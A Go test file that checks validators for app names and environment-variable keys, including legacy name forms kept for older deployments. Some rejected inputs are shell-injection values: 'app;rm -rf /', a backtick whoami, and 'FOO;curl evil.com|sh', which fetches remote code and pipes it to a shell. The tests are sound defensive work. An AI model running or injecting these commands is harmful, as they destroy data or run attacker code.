package ssh

import "testing"

func TestValidateAppName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "myapp", false},
		{"valid with dash", "my-app", false},
		{"valid with numbers", "app123", false},
		{"valid single char", "a", false},
		{"valid single digit", "1", false},
		{"valid leading digit", "1app", false},
		{"invalid with underscore", "my_app", true},
		{"invalid uppercase", "MyApp", true},
		{"invalid all uppercase", "APP", true},
		{"empty", "", true},
		{"starts with dash", "-app", true},
		{"ends with dash", "app-", true},
		{"starts with underscore", "_app", true},
		{"contains space", "my app", true},
		{"contains dot", "my.app", true},
		{"contains slash", "my/app", true},
		{"shell injection semicolon", "app;rm -rf /", true},
		{"shell injection backtick", "app`whoami`", true},
		{"too long", "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkl", true},
		{"max length 63", "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateAppName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAppName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateAppNameExisting(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Strict-superset: everything the new rule accepts must still pass.
		{"dns-1123 simple", "myapp", false},
		{"dns-1123 with dash", "my-app", false},
		{"dns-1123 leading digit", "1app", false},
		// Legacy forms still accepted for teardown/inspection of v0.1.x deployments.
		{"legacy uppercase", "MyApp", false},
		{"legacy all uppercase", "APP", false},
		{"legacy underscore", "my_app", false},
		{"legacy mixed", "My_App-1", false},
		// Still-rejected shapes — the loose rule never allowed these.
		{"empty", "", true},
		{"starts with dash", "-app", true},
		{"starts with underscore", "_app", true},
		{"contains space", "my app", true},
		{"contains dot", "my.app", true},
		{"contains slash", "my/app", true},
		{"shell injection semicolon", "app;rm -rf /", true},
		{"shell injection backtick", "app`whoami`", true},
		{"too long", "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklm", true},
		{"legacy max length 64", "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkl", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateAppNameExisting(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAppNameExisting(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateEnvKey(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid upper", "FOO", false},
		{"valid lower", "foo", false},
		{"valid with number", "FOO123", false},
		{"valid underscore prefix", "_FOO", false},
		{"valid mixed", "App_Name_1", false},
		{"empty", "", true},
		{"starts with number", "1FOO", true},
		{"contains dash", "FOO-BAR", true},
		{"contains space", "FOO BAR", true},
		{"contains equals", "FOO=BAR", true},
		{"shell injection", "FOO;curl evil.com|sh", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateEnvKey(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateEnvKey(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}
